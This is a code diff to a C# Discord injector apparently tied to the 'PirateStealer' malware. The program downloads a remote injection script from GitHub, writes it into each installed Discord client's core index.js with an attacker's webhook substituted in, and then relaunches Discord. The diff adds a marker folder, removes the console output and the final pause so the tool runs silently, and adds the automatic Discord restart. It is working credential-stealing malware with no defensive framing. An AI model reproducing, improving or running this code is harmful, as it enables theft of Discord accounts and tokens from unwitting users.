@@ -46,6 +46,7 @@ namespace PirateMonsterInjector
                                 {
                                     if (item.Contains("discord_desktop_core"))
                                     {
+                                        Directory.CreateDirectory(item + @"\discord_desktop_core\PirateStealerBTW");
                                         path = item + @"\discord_desktop_core\index.js";
                                     }
                                 }
@@ -64,6 +65,7 @@ namespace PirateMonsterInjector
 
         static void DiscordProcesses()
         {
+            List<string> discordproc = new List<string>();
             foreach (var item in Process.GetProcesses())
             {
                 if (item.ProcessName.Contains("iscord"))
@@ -72,19 +74,19 @@ namespace PirateMonsterInjector
                 }
             }
 
+
         }
         static void Main(string[] args)
         {
             DiscordProcesses();
             WebClient client = new WebClient();
             string script = client.DownloadString("https://raw.githubusercontent.com/Stanley-GF/PirateStealer/main/src/Injection/injection");
-            Console.Write(script);
             foreach (var item in GetDiscords())
             {
                 try
                 {
                     File.WriteAllText(GetIndex(item), script.Replace("%WEBHOOK_LINK%", Settings.Webhook));
-                    Console.WriteLine(GetIndex(item));
+                    
                 }
                 catch (Exception)
                 {
@@ -92,7 +94,10 @@ namespace PirateMonsterInjector
 
                 }
             }
-            Console.ReadKey();
+            foreach (var item in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Start Menu\Programs\Discord Inc"))
+            {
+                Process.Start(item);
+            }
         }
     }
 }
